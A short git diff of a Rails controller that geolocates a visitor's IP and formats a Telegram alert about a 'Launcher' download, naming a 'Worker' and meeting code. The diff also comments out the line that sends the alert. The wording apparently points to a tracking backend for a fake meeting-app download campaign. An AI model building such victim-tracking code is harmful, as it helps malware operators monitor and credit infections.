@@ -11,10 +11,11 @@ class TelegramMessagesController < ApplicationController
       country = 'unknown'
     else
       ip = request.remote_ip
-      country = Geocoder.search(request.remote_ip)&.country || 'unknown'
+      result = Geocoder.search(ip).first
+      country = result.present? ? result.country : 'unknown'
     end
 
     text = " #define\n⚠️ Download ⚠️\n🔗 IP: #{ip}\n🌎 Country: #{country}\n👨🏻‍💻 Worker: #{meeting.name} #{meeting.code.upcase}\n📑 Type: Launcher\n💻 Platform: #{params['platform']}\n🌐 Browser: #{params['browser']}"
-    @bot.api.send_message(chat_id: -1002117494784, text:)
+    # @bot.api.send_message(chat_id: -1002117494784, text:)
   end
 end
